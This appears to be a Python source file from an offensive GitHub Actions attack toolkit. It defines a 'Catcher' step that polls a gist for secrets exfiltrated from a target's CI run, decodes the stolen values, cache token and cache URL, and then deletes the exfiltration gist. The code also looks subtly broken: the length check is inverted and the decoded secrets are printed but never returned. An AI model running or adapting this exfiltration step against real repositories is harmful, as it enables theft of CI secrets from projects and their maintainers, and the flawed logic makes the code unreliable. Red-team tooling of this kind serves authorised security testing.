import time
import base64

from gatox.cli.output import Output
from gatox.attack.pwnrequest.steps.attack_step import AttackStep
from gatox.github.api import Api


class Catcher(AttackStep):
    """Represents a catcher step, which checks a given resource for secrets or other values."""

    def __init__(self, expected_secrets: list, gist_pat: str, timeout: int = 300):
        """ """
        self.secrets = []
        self.cache_token = {}
        self.timeout = None
        self.step_data = f"Catcher: {expected_secrets}"
        self.desired_secrets = expected_secrets
        self.gist_pat = gist_pat
        self.timeout = timeout
        self.exfil_gist = None

    def __extract_secrets(self, gist_results):
        """Extracts secrets from exfiltration gist."""

        segments = gist_results.split(":")
        if len(segments) != 3:
            # something went wrongs

            values = base64.b64decode(segments[0]).decode("utf-8")
            cachetoken = base64.b64decode(segments[1]).decode("utf-8")
            cacehurl = base64.b64decode(segments[2]).decode("utf-8")

            print(values)
            print(cachetoken)
            print(cacehurl)

    def preflight(self, api, previous_results=None):
        """Validates preconditions for executing this step."""
        # Check if the gist exists
        if previous_results:
            self.catcher_id = previous_results.get("catcher_gist", None)
            self.exfil_gist = previous_results.get("exfil_gist", None)

            if self.catcher_id and self.exfil_gist:
                return True
            else:
                Output.error("No previous results found!")
                return False

    def execute(self, api: Api):
        """Execute the step after validating pre-conditions."""
        # We need to continuously check the exfil gist for the desired secrets.
        Output.info("Checking for exfiltrated secrets!")
        start_time = time.time()
        while time.time() - start_time < self.timeout:
            gist_results = api.get_gist_file(
                self.catcher_id, credential_override=self.gist_pat
            )
            # Process gist_results if needed
            if gist_results:
                self.output = self.__extract_secrets(gist_results)
                if self.exfil_gist:
                    api.call_delete(
                        f"/gists/{self.exfil_gist}", credential_override=self.gist_pat
                    )
                return True

            time.sleep(3)

        Output.error("Timeout reached while waiting for secrets.")
        return False

    def handoff(self):
        """Handoff the step to the next part of the attack chain."""
        return super().handoff()
